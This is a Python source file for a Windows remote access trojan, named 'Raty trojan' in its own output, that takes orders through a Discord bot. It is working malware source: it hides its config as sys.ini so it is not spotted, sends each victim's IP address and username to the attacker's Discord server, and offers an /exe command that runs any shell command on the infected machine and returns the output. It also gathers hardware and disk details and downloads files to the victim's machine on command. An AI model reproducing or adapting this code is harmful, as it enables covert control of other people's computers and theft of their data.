# Setup program
import discord
from discord.ext import commands
import sys
import os
from colorama import init
from termcolor import colored
import os
from random import randint
import getpass
import requests
import subprocess
import math
import psutil
import cpuinfo
import GPUtil
from datetime import datetime
from datetime import date
import platform
import win32api
import shutil
import ctypes
import wget
import sys
import multiprocessing



# Declaring some functions to simplify the code
#          <[Declaring Functions]>

def convertTime(seconds): 
    minutes, seconds = divmod(seconds, 60) 
    hours, minutes = divmod(minutes, 60) 
    return "%d:%02d:%02d" % (hours, minutes, seconds) 

def available_disks():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    return drives

def disk_space(drive_letter):
      total, used, free = shutil.disk_usage(drive_letter)
      return [total // (2**30), used // (2**30), free // (2**30)]

def Mbox(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)

def get_cpu_type():
    from win32com.client import GetObject
    root_winmgmts = GetObject("winmgmts:root\cimv2")
    cpus = root_winmgmts.ExecQuery("Select * from Win32_Processor")
    return cpus




# Declaring global variables to avoid errors and simplify the overall code
#                 <[Declaring Global Variables]>

secondmessage = False
sch = 5
cname = ''
stop = False
url = ""





# Create a file called token.txt with in the same directory as the script, with the token inside it - this program uses an integration bot to access the hacker's Discord control server. It is very easy to setup a BOT, here is a tutorial on how to do it: https://www.youtube.com/watch?v=nW8c7vT6Hl4&ab_channel=Lucas
#                                                                                                                                   <[Discord API Bot Token]> 

try:  
      with open("token.txt", "r") as tokenfile:
            token = tokenfile.read()
            if token == "":
                  Mbox('API Token not found', 'Please edit the token.txt file with your Discord Bot API Token', 1)
                  stop = True
                  sys.exit()
except:
      if stop == False:
            Mbox('API Token not found', 'Create token.txt in the same directory with Discord Bot API token inside', 1)
            sys.exit()
      sys.exit()





# Contains the interaction methods with the Discord Server.
#         <[Defining Discord Client Object]>

client = discord.Client()






# What happens when the bot successfully connects to Discord API
#                         <[Code setup]>

@client.event
async def on_ready():
      # Shows startup message and clears the prompt to give a more cleaner look. The bot should appear online as soon as this message shows up.
      #                                                           <[Connection Notification]>

      global sch, cid, cname
      os.system("cls")
      print(colored("Raty trojan online!", 'green'))



      # Declaring some counting and assisting variables for the stup
      #                   <[Variable Declaration]>
      txtcl = []
      server = client.guilds
      found = False



      # Getting available channels to see already taken Infection IDs, as the unique control channel of each PC has the Windows User username and followed by the ID.
      #                                                                  <[Getting Channel Names]>

      for channel in server[0].channels:
            txtcl.append(channel.name)




      # Checking if there is a config file. If there is one, it reads the unique channel name and declares the channel object. If not, it starts generating infection IDs and checking if it is already taken by trying to find that ID on the channel names list. When it finds one that isn't available, it creates a config file with the unique control channel name. The file is called "sys.ini" to blend in with windows files so it doesn't get spotted
      #                                                                                                                       <[Installing on PC / Loading Configuration]>           
                                                                              
      if 'sys.ini' in os.listdir('C:\\Users\\Public\\'):
            with open('C:\\Users\\Public\\sys.ini', 'r') as idf:
                  cname = idf.read()
                  cid = cname.split("|")[1]
                  sch = discord.utils.get(client.guilds[0].channels, name=cname)
                  cname = cname.replace('|', '´')


      else:
            with open('C:\\Users\\Public\\sys.ini', 'w') as idf:
                  while True:
                        found = False
                        tryc = randint(0, 10000000000000)
                        for channel in txtcl:
                              if str(tryc) in channel:
                                    found = True
                                    break
                        if found == False:
                              cid = tryc
                              idf.write(str(getpass.getuser()) + "|" + str(cid))
                              break
            username = channel.split('´')[0]
            print(username)






            # Sends basic information about the infection/machine properties to the unique control channel.
            #                                <[Sending Information Embed]>
            
            ipaddr = requests.get('https://api.ipify.org').text
            embed = discord.Embed(title=f"New infection", description="New infected machine with the following info\n ⠀", color=discord.Color.blue())
            embed.add_field(name="IP Adress", value=requests.get('https://api.ipify.org').text, inline=True)
            embed.add_field(name="Username", value=f"{getpass.getuser()}", inline=True)
            embed.add_field(name="Infection ID", value=cid, inline=True)
            await client.guilds[0].create_text_channel(str(getpass.getuser()) + "´" + str(cid))
            cname = str(getpass.getuser()) + "´" + str(cid)
            sch = discord.utils.get(client.guilds[0].channels, name=cname)
            await sch.send(embed=embed)
            

# When a message is received
@client.event
async def on_message(message):



      # This is where the channel objects get defined and ready to be used, the description of each channel can be found bellow.
      #                                         <[Initialization - channel objects]>

      global cname, secondmessage, url, path
      sch = discord.utils.get(client.guilds[0].channels, name=cname)
      main_channel = client.get_channel(811346666879713281)



      #This command downloads a specific file. Usage: 1st message- /download <url> 2nd message - <file save path>
      #              <[Adding Hacker-available command - Feature currently in focused development]>

      if f"/download" in message.content[0:10] or secondmessage == True:
            if message.content.replace(" ", "") == "/download":
                  embed = discord.Embed(title=f"Download command help", description=f'Help to /download command\n\nSend 2 messages:\n⠀⠀⠀⠀Message 1: download url\n⠀⠀⠀⠀Message 2: file save location\n\nTo cancel the operation at any message, write "cancel"', color=discord.Color.gold())
                  await message.channel.send(embed=embed)
                  return
            if secondmessage == True:
                  if message.content == "cancel":
                        embed = discord.Embed(title="Download cancelled", description="/download command canceled", color=discord.Color.red())
                        await message.channel.send(embed=embed)
                        secondmessage = False
                        return
                  else:
                        path = message.content
                        secondmessage = False
                        embed = discord.Embed(title="Downloading file", description=f"Downloading requested file on machine with ID {cid}", color=discord.Color.green())
                        embed.add_field(name="Download URL", value=url, inline=False)
                        embed.add_field(name="Save Location", value=path, inline=False)
                        await message.channel.send(embed=embed)
            else:
                  if message.content == "cancel":
                        embed = discord.Embed(title="Download cancelled", description=f"File download canceled on machine with ID {cid}", color=discord.Color.red())
                        await message.channel.send(embed=embed)
                        return
                  else:
                        url = message.content[10:]   
                        secondmessage = True          
            






      #This command sends advanced informations of the infected machine. The given informations contain the Battery Level of the machine, the infection ID, the CPU Model, the GPU Chipset, the used, free and total space on each connected drive and so on.
      #                                                                                    <[Adding Hacker-available command - Feature currently in focused development]>
      
      if f"/info" in message.content[0:5]:
            if f"/info windows" in message.content[0:13]:
                  embed = None
                  embed = discord.Embed(title=f"Machine info", description=f"Requested Windows info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
                  embed.add_field(name="Windows Version", value=platform.platform(), inline=True)
                  embed.add_field(name="Architecture", value=platform.machine(), inline=True)
                  embed.add_field(name="Username", value=f"{getpass.getuser()}", inline=True)
                  await message.channel.send(embed=embed)
            elif f"/info gpu" in message.content[0:9]:
                  for index in range(0, len(GPUtil.getGPUs())):
                        embed = None
                        embed = discord.Embed(title=f"Machine info", description=f"Requested Windows info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
                        embed.add_field(name=f"GPU {index+1} Chipset", value=GPUtil.getGPUs()[index].name, inline=True)
                        embed.add_field(name=f"GPU {index+1} Driver Version", value=GPUtil.getGPUs()[index].driver, inline=True)
                        embed.add_field(name=f"GPU {index+1} Memory Size", value=str(GPUtil.getGPUs()[index].memoryTotal) + "MB", inline=True)
                  await message.channel.send(embed=embed)
            elif f"/info cpu" in message.content[0:9]:
                  embed = None
                  embed = discord.Embed(title=f"Machine info", description=f"Requested CPU info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
                  for index in range(0, len(get_cpu_type())):
                        embed.add_field(name=f"CPU {index+1} Name", value=str(get_cpu_type()[index].Name), inline=True)
                        embed.add_field(name=f"CPU {index+1} Thread Count", value=str(multiprocessing.cpu_count()), inline=True)
                  embed.add_field(name="Architecture", value=platform.machine(), inline=False)
                  await message.channel.send(embed=embed)
            elif f"/info battery" in message.content[0:13]:
                  embed = None
                  battery = psutil.sensors_battery()
                  sl = str(convertTime(battery.secsleft)).replace("-", "")
                  try:
                        embed = discord.Embed(title=f"Machine info", description=f"Requested Windows info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
                        embed.add_field(name="Battery Level", value=battery.percent, inline=True)
                        embed.add_field(name="Time Left", value=sl, inline=True)
                        if battery.power_plugged:
                              embed.add_field(name="Battery Status", value="Charging", inline=True)
                        else:
                              embed.add_field(name="Battery Status", value="Discharging", inline=True)
                  except:
                        embed = discord.Embed(title=f"Error", description=f"Battery not available on machine with ID {cid}", color=discord.Color.red())
                  await message.channel.send(embed=embed)
            elif f"/info disk" in message.content[0:10]:
                  adisks = available_disks()
                  embed = None
                  embed = discord.Embed(title=f"Disk Info", description=f"Requested disk info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
                  for disk in adisks:
                        embed.add_field(name=f"Total Space on {disk[:-1]}", value=str(disk_space(disk)[0]) + "GB", inline=True)
                        embed.add_field(name=f"Free Space on {disk[:-1]}", value=str(disk_space(disk)[2]) + "GB", inline=True)
                        embed.add_field(name=f"Used Space on {disk[:-1]}", value=str(disk_space(disk)[1]) + "GB", inline=True)
                  await message.channel.send(embed=embed)
            """embed = discord.Embed(title=f"Machine info", description=f"Requested system info of machine with ID {cid}\n ⠀", color=discord.Color.blue())
            embed.add_field(name="IP Adress", value=requests.get('https://api.ipify.org').text, inline=True)
            embed.add_field(name="Username", value=f"{getpass.getuser()}", inline=True)
            embed.add_field(name="Infection ID", value=cid, inline=True)
            embed.add_field(name="Battery Level", value=bp, inline=True)
            embed.add_field(name="CPU Model", value=cpuinfo.get_cpu_info()['brand_raw'], inline=True)
            for index in range(0, len(GPUtil.getGPUs())):
                  embed.add_field(name=f"GPU {index+1} Chipset", value=GPUtil.getGPUs()[index].name, inline=True)
                  embed.add_field(name=f"GPU {index+1} Driver Version", value=GPUtil.getGPUs()[index].driver, inline=True)
                  embed.add_field(name=f"GPU {index+1} Memory Size", value=str(GPUtil.getGPUs()[index].memoryTotal) + "MB", inline=True)
            embed.add_field(name="Bit Number", value=platform.machine(), inline=True)
            embed.add_field(name="Operating System", value=platform.platform(), inline=True)"""


      




      #This command executes a custom Windows Powershell™ command
      #           <[Adding Hacker-available command]>

      elif f"/exe " in message.content[0:5]:

            try: #Default - return an Embed with the command return and info
                  answerprev = subprocess.Popen(message.content[5:], shell=True, stdout=subprocess.PIPE)
                  answer = str(answerprev.stdout.read())
                  embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.green())
                  embed.add_field(name="Command", value=f"{message.content[5:]}", inline=False)
                  embed.add_field(name="Return", value=f"{answer}", inline=False)
                  await message.channel.send(embed=embed)
            except:

                  try: #Option B - If the default option fails (Probably due to the command being too long to send in one message, like "ipconfig" or "tasklist") it sends a .txt file with the command return.
                        embed = discord.Embed(title="Executing command", description=f"Commmand executed on machine with ID {cid}", color=discord.Color.green())
                        embed.add_field(name="Command", value=f"{message.content[5:]}", inline=False)
                        await message.channel.send(embed=embed)
                        with open("C:\\Users\\Public\\temps.txt", "w") as file:
                              file.write(answer.replace('\\r', '\r').replace('\\n', '\n'))
                        with open('C:\\Users\\Public\\temps.txt', "rb") as file:
                              await message.channel.send(file=discord.File(file, "return.txt"))

                  except: #Option C - If the option B fails (porbably due to the return being freaking BIG, like the "tree" command executed directly on the main drive (C:\) driectory) it sends the return splited in multiple files of 976500 characters each. There is no file limit, it will send the much files it needs to send the whole return.
                        for c in range(0, math.ceil(len(answer) / 976500)+1):
                              with open(f"C:\\Users\\Public\\temps{c}.txt", "w") as file:
                                    file.write(answer[c*976500:(c+1)*976500].replace('\\r', '\r').replace('\\n', '\n'))
                              with open(f'C:\\Users\\Public\\temps{c}.txt', "rb") as file:
                                    await message.channel.send(file=discord.File(file, f"return{c}.txt"))







      #This command sends the current IPv4 public IP adress of the infected machine 
      #               <[Adding Hacker-available command]>

      elif f"/ip" in message.content[0:4]:
            embed = discord.Embed(title="Current IP Adress", description=f"Requested IP adress of machine with ID {cid}", color=discord.Color.blue())
            embed.add_field(name="IP Adress", value=f"{requests.get('https://api.ipify.org').text}", inline=False)
            await message.channel.send(embed=embed)

            

client.run(token)